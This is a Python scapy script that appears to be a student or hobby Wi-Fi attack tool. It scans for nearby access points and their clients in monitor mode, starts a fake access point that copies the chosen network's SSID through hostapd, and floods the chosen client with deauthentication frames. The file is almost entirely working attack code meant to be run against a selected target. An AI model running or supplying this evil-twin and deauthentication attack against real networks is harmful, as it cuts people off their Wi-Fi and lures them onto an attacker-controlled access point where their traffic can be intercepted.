from scapy.all import * 
import os
from threading import Thread
import time

#------ global variables ------ 

interface = "" # indentfied Network Card

# APs
AP_dict = {} #founded AP , {key - index, value=list[addr2=mac_ap , addr3=? , info=name(ssid) , channel=channel_of_ap]}
index_AP_target = 0 #for packet handling wifi
AP_target = [] #details of chosen AP = [0 : addr2 (mac address) , 1 : addr3 , 2 : info (ssid=wifi name) , 3 : channel of AP]

#clients
station_dict = {} # {key - index ,value - mac_client}
index_client_target = 0


# ------  network card Mode ------

def changeToMonitorMode(iface):
    os.system("sudo ifconfig " + iface + " down")
    os.system("sudo iwconfig " + iface +" mode monitor")
    os.system("sudo ifconfig " + iface +" up")

    os.system("iwconfig") #show as the mode changed

def changeToManagedMode(iface):
    os.system("sudo ifconfig " + iface + " down")
    os.system("sudo iwconfig " + iface + " mode Managed")
    os.system("sudo ifconfig " + iface +" up")
    os.system("iwconfig") #show as the mode changed


#--- Scan ---

def scanWifi() ->None:
    global interface
    #Scanning access point Wifi
    print("scanning for Wifi...")
    channel_changer = Thread(target=changeChannels)
    channel_changer.daemon = True
    channel_changer.start()
    sniff(iface=interface ,prn = packetHandlerForAP, timeout = 10)

def scanClients() -> None:
    print("scanning clients...")
    sniff(iface=interface, prn = packetHandlerForClients , timeout=10)

    if len(station_dict) == 0: # the clients dictionary is empty
        print("did not find any client")


#------ Handling packet ------

def packetHandlerForAP(packet):
    global index_AP_target
    global AP_dict
    # if packet has 802.11 layer (Dot11 = 802.11)
    # Beacon - announce the presence of a wireless LAN
    if packet.haslayer(Dot11Beacon):
        
        # check if we had this AP already
        flag = False
        for i in AP_dict:
            key_list = AP_dict.get(i)
            if packet.addr2 in key_list:
                flag = True
                break

        # if mac adder is not already in our dictionary of AP (addr2 = MAC address)
        if flag == False:
            stats = packet[Dot11Beacon].network_stats()
            channel = stats.get("channel")
            
            ap_point_list = []
            ap_point_list.append(packet.addr2) # BSSID
            ap_point_list.append(packet.addr3)
            ap_point_list.append(packet.info) #append SSID
            ap_point_list.append(channel)
            AP_dict[index_AP_target] = ap_point_list
            
            print("index: ", index_AP_target,"   addr2(MAC): ", packet.addr2, "   info(SSID): " ,packet.info, "   channel: ", channel)
            index_AP_target = index_AP_target + 1

        


def packetHandlerForClients(packet):
    global AP_target
    BSSID_target = AP_target[0]
    global AP_dict
    global station_dict
    global index_client_target
    flag = False

    if packet.addr1 != "ff:ff:ff:ff:ff:ff" and (packet.addr2 == BSSID_target or packet.addr3 == BSSID_target):
                if packet.addr2 != packet.addr1 and packet.addr1 != packet.addr3:
                    for x in station_dict.values():
                         if packet.addr1 == x:
                             flag = True
                             break

                    if flag == False:

                        station_dict[index_client_target] = packet.addr1
                            
                        print("index: ", index_client_target, "    addr1(src): ", packet.addr1, "   addr2(dest): ", packet.addr2,  "    addr3(?): ", packet.addr3)
                        index_client_target = index_client_target + 1


# ------ Channel ------

def changeChannels():
    global interface
    ch = 1
    start = time.time()

    while True:
        os.system("sudo iwconfig " + interface +  " channel " + str(ch))
        # switch channel from 1 to 14 each 5s
        ch = ch % 14 + 1
        end = time.time()

        if end-start > 60 : 
            break #end loop

        time.sleep(0.5)


def changeChannelToAP(index : int) -> None:
    global interface
    global AP_dict
    AP_details = AP_dict.get(index)
    channel_target = AP_details[3] #get the channel
    channel_target_converted = str(channel_target)
    os.system("sudo iwconfig " + interface + " channel " + channel_target_converted)

# ----- Fake AP -----
def createFakeAP():
    global interface
    global AP_target

    f = open("hostapd.conf", "w+")
    f.write('''interface=''' +interface+ '''\ndriver=nl80211 \nssid=''' +AP_target[2]+ '''\nhw_mode=g \nchannel=7 \nmacaddr_acl=0 \nignore_broadcast_ssid=0''')
    f.close()

    os.system("hostapd hostapd.conf") # raising fake AP


# ----- deauthotication attack -----
def deauth(client_index:int) -> None:
    global interface
    global station_dict
    global AP_target
    print("client_index: ", client_index)
    print("client mac: ", station_dict.get(client_index))
    print("addr2: ", AP_target[0])
    print("addr3: ", AP_target[1])

    for y in range(2000): 
        pkt = RadioTap()/Dot11(addr1=station_dict.get(client_index), addr2=AP_target[0], addr3=AP_target[1])/Dot11Deauth()
        sendp(pkt, iface=interface, count=30, inter = .001)



def main():
    os.system("iwconfig") #to see our interfaces we have
    global interface
    global AP_dict
    global AP_target
    global station_dict
    interface = input("please insert iface: ")
    os.system("clear")
    changeToMonitorMode(interface)

    #--- Scanning access point Wifi ---
    retry_wifi = 'y'
    while retry_wifi =='y':
        
        scanWifi()

        if len(AP_dict) == 0: #if we doesn't found any access point
            print("doesn't found any access points")
        
        retry_wifi = input("for scanning AP again please insert - 'y' else press Enter : ")



    convertedChosen = -1
    while True:
        #choose access point
        chosenAP = input("Enter an access point index to attack: ")

        #Check input
        try:
            convertedChosen = int(chosenAP)
        except ValueError:
            print("That's not a number")
            continue

        if convertedChosen in AP_dict:
            break
        
        print("Invalid index")


    changeChannelToAP(convertedChosen)

    # saves the details of the chosen AP
    AP_target = AP_dict.get(convertedChosen)

    # --- Scanning clients ---
    retry_clients = 'y'
    while retry_clients == 'y':

        scanClients()

        if len(station_dict) == 0:
            print("doesn't found any clients")

        retry_clients = input("For scanning clients again please insert - 'y' else press Enter :  ")
    

    if len(station_dict) == 0:
        sys.exit() # end script
        
    client_index = input("Choose client to attack: ")
    

    #--- Create FakeAP ---
    create_fake_AP = Thread(target=createFakeAP)
    create_fake_AP.daemon = True
    create_fake_AP.start()
    
    #--- Attack ---
    deauth(int(client_index))


    changeToManagedMode(interface) # change back to default mode
    
    

if __name__ == "__main__":
    main()